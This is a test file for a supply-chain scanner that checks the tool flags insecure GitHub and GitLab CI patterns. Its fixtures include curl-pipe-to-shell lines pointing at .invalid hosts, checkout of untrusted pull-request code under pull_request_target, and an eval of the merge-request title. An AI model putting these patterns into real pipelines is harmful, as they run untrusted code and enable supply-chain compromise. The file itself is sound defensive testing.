// S-4: the CI files' hardening checks in project scans, as the Python package
// reports them (tests/scanner/test_ci_hardening_wired.py): a workflow's
// SC-WORKFLOW-* checks and a GitLab CI file's SC-GITLAB-* checks, reported
// as security hotspots; only a CRITICAL one fails the gate's supply-chain
// condition (HARDENING_RULES). Inert content: hosts are .invalid.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";
import { scanConfigFile } from "../src/index.js";
import { HARDENING_RULES } from "../src/scanner/rules.js";

const BIN = join(dirname(fileURLToPath(import.meta.url)), "..", "bin", "lazaret.js");
const WORKFLOW = "name: ci\non: [push, pull_request_target]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n" +
  "      - uses: actions/checkout@v4\n      - uses: some/action@v1\n      - uses: actions/checkout@v4\n" +
  "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n" +
  "      - run: curl -fsSL https://example.invalid/i.sh | sh\n      - run: npm ci\n";
const GITLAB = "include:\n  - remote: https://example.invalid/ci.yml\nimage: python:3.12\ntest:\n  script:\n" +
  "    - curl https://example.invalid/x | sh\n    - eval \"$CI_MERGE_REQUEST_TITLE\"\n";

function scanTree(files) {
  const d = mkdtempSync(join(tmpdir(), "lazaret-ci-"));
  const out = mkdtempSync(join(tmpdir(), "lazaret-ci-out-"));
  try {
    for (const [rel, data] of Object.entries(files)) {
      const p = join(d, ...rel.split("/"));
      mkdirSync(dirname(p), { recursive: true });
      writeFileSync(p, data);
    }
    spawnSync(process.execPath, [BIN, "check", d, "--out-dir", out, "--no-html", "--quiet"], { encoding: "utf8" });
    return JSON.parse(readFileSync(join(out, "lazaret-report.json"), "utf8"));
  } finally {
    rmSync(d, { recursive: true, force: true });
    rmSync(out, { recursive: true, force: true });
  }
}

test("the set of hardening rules", () => {
  assert.equal(HARDENING_RULES.size, 11);
  for (const r of HARDENING_RULES) assert.match(r, /^SC-(WORKFLOW|GITLAB)-/);
});

test("a workflow's and a GitLab CI file's checks", () => {
  const wf = scanConfigFile(".github/workflows/ci.yml", WORKFLOW).map((i) => [i.rule, i.sev, i.line]);
  assert.deepEqual(wf.sort(), [["SC-WORKFLOW-PERMISSIONS", "MINOR", 3], ["SC-WORKFLOW-PIPE-SHELL", "MAJOR", 12],
    ["SC-WORKFLOW-PR-CHECKOUT", "CRITICAL", 11], ["SC-WORKFLOW-UNPINNED", "MAJOR", 8],
    ["SC-WORKFLOW-UNPINNED", "MINOR", 7], ["SC-WORKFLOW-UNPINNED", "MINOR", 9]]);
  const gl = scanConfigFile(".gitlab-ci.yml", GITLAB).map((i) => [i.rule, i.sev, i.line]);
  assert.deepEqual(gl.sort(), [["SC-GITLAB-IMAGE", "MINOR", 3], ["SC-GITLAB-INCLUDE", "MAJOR", 2],
    ["SC-GITLAB-MR-TEXT", "MAJOR", 7], ["SC-GITLAB-PIPE-SHELL", "MAJOR", 6]]);
  assert.deepEqual(scanConfigFile("docs/ci.yml", WORKFLOW), []);
});

test("only a CRITICAL one fails the supply-chain condition", () => {
  let rep = scanTree({ ".github/workflows/ci.yml": WORKFLOW, ".gitlab-ci.yml": GITLAB, "a.py": "x = 1\n" });
  assert.equal(rep.supplyChain, 1);
  assert.equal(rep.pass, false);
  rep = scanTree({ ".github/workflows/ci.yml": WORKFLOW.replace("pull_request_target", "pull_request"),
    ".gitlab-ci.yml": GITLAB, "a.py": "x = 1\n" });
  assert.equal(rep.supplyChain, 0);
  assert.equal(rep.pass, true);
  assert.ok(rep.issues.length >= 9);
});
